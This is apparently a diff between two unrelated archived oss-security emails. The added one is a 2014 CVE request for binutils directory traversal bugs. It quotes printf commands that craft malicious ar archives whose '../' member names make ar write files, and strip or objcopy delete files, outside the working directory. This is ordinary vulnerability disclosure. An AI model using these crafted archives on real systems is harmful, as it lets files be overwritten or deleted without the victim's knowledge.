@@ -1,32 +1,54 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/03/07/7
-Message-Id: <20140307200028.7EA9D20106@smtp.hushmail.com>
-Date: Fri, 07 Mar 2014 20:00:28 +0000
-From: "mancha" <mancha1@...h.com>
-To: cve-assign@...re.org
-Cc: oss-security@...ts.openwall.com
-Subject: Re: CVE Request/Clarification - PHP
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/11/04/10
+Message-ID: <5459547E.1090408@mccme.ru>
+Date: Wed, 05 Nov 2014 01:34:38 +0300
+From: Alexander Cherepanov <cherepan@...me.ru>
+To: oss-security@...ts.openwall.com
+Subject: CVE Request: binutils -- directory traversal
 Content-Type: text/plain; charset=utf-8
 
-On Fri, 07 Mar 2014 15:31:00 +0000 cve-assign@...re.org wrote:
->> Two issues were recently identified as security concerns in
->> libmagic: CVE-2014-1943 (infinite recursion flaw) &
->> CVE-2014-2270 (improper bounds checking).
->> 
->> What is the policy regarding CVE allocation for products
->> vulnerable by virtue of bundling copies of vulnerable products
->> (as opposed to, say, linking vulnerable system libraries)?
->> 
->> I bring this up because PHP embeds a copy of libmagic
->
->A CVE assignment for libmagic (in the file product) can be used
->by all vendors who bundle libmagic. Different copies of libmagic
->in different products do not have separate CVE IDs.
->
->-- 
->CVE assignment team, MITRE CVE Numbering Authority
+Hello,
 
-Many thanks for that clarification.
+it seems binutils don't check paths when extracting files from archives.
 
---mancha
+----------------------------------------------------------------------
+ From https://sourceware.org/bugzilla/show_bug.cgi?id=17533#c4 :
 
+directory traversal [in ar]:
+
+$ printf '!<arch>\n%-48s%-10d`\n../file\n%-48s%-10s`\n' '//' 8 '/0' 0 > 
+test.a
+$ ar xv test.a
+x - ../file
+
+ From https://sourceware.org/bugzilla/show_bug.cgi?id=17533#c7 :
+
+Both absolute and relative paths could be used for the attack.
+
+----------------------------------------------------------------------
+ From https://sourceware.org/bugzilla/show_bug.cgi?id=17552 :
+
+strip and objcopy don't filter out .. components from paths inside archive.
+
+Consider an archive created with the following command:
+
+$ printf '!<arch>\n%-48s%-10d`\n../file\n%-48s%-10s`\n' '//' 8 '/0' 0 > 
+test.a
+
+then runnig strip/objcopy on it will unlink ./file (e.g. 
+unlink("stq0g2tL/../st4Mtgu4/../file") ).
+
+Consider this:
+
+$ printf '!<arch>\n%-48s%-10d`\n../../file\n\n%-48s%-10s`\n' '//' 12 
+'/0' 0 > test.a
+
+then runnig strip/objcopy on it will unlink ../../file (e.g. 
+unlink("staOxyFW/../../st4KIqLm/../../file") ).
+
+----------------------------------------------------------------------
+
+Could CVEs please be assigned to these issues?
+
+-- 
+Alexander Cherepanov
